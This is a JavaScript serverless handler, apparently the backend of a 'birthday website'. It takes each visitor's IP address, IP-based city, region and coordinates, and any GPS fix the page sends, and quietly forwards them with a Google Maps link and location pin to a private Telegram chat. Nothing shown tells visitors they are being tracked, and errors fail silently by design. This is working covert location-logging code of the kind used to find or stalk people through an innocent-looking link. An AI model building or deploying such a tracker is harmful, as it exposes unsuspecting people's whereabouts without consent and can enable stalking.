export default async function handler(req, res) {
  // Set CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { lat, lng, source, accuracy } = req.body || {};

  // Get IP-based location from Vercel's automatic geo headers
  const ipCity = req.headers['x-vercel-ip-city'] || 'Unknown';
  const ipCountry = req.headers['x-vercel-ip-country'] || 'Unknown';
  const ipRegion = req.headers['x-vercel-ip-country-region'] || 'Unknown';
  const ipLat = req.headers['x-vercel-ip-latitude'] || null;
  const ipLng = req.headers['x-vercel-ip-longitude'] || null;
  const visitorIP = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.headers['x-real-ip'] || 'Unknown';

  const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
  const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error('Telegram credentials not configured');
    return res.status(200).json({ ok: true }); // Silent fail — don't expose errors
  }

  // Determine best available coordinates
  const finalLat = lat || ipLat;
  const finalLng = lng || ipLng;
  const mapsLink = finalLat && finalLng
    ? `https://maps.google.com/?q=${finalLat},${finalLng}`
    : null;

  // Format timestamp in IST
  const now = new Date().toLocaleString('en-IN', {
    timeZone: 'Asia/Kolkata',
    dateStyle: 'medium',
    timeStyle: 'medium'
  });

  // Build the Telegram message
  let message = `🌍 *New Visitor on Birthday Website\\!*\n\n`;

  if (source === 'gps') {
    message += `📡 *Source:* GPS \\(Exact\\)\n`;
    message += `📍 *Latitude:* \`${lat}\`\n`;
    message += `📍 *Longitude:* \`${lng}\`\n`;
    if (accuracy) {
      message += `🎯 *Accuracy:* ~${Math.round(accuracy)}m\n`;
    }
  } else {
    message += `🌐 *Source:* IP\\-Based \\(Approximate\\)\n`;
    if (ipLat && ipLng) {
      message += `📍 *Latitude:* \`${ipLat}\`\n`;
      message += `📍 *Longitude:* \`${ipLng}\`\n`;
    }
  }

  message += `\n🏙️ *City:* ${escapeMarkdown(decodeURIComponent(ipCity))}\n`;
  message += `🗺️ *Region:* ${escapeMarkdown(ipRegion)}\n`;
  message += `🌍 *Country:* ${escapeMarkdown(ipCountry)}\n`;
  message += `🔗 *IP:* \`${visitorIP}\`\n`;

  if (mapsLink) {
    message += `\n🗺️ [Open in Google Maps](${escapeMarkdown(mapsLink)})\n`;
  }

  message += `\n🕐 *Time:* ${escapeMarkdown(now)}`;

  // Send text message
  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'MarkdownV2',
        disable_web_page_preview: true
      })
    });
  } catch (err) {
    console.error('Telegram message error:', err);
  }

  // If GPS, also send a clickable location pin
  if (source === 'gps' && lat && lng) {
    try {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendLocation`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          latitude: parseFloat(lat),
          longitude: parseFloat(lng)
        })
      });
    } catch (err) {
      console.error('Telegram location pin error:', err);
    }
  }

  return res.status(200).json({ ok: true });
}

// Escape special characters for Telegram MarkdownV2
function escapeMarkdown(text) {
  if (!text) return '';
  return String(text).replace(/([_*\[\]()~`>#+\-=|{}.!\\])/g, '\\$1');
}
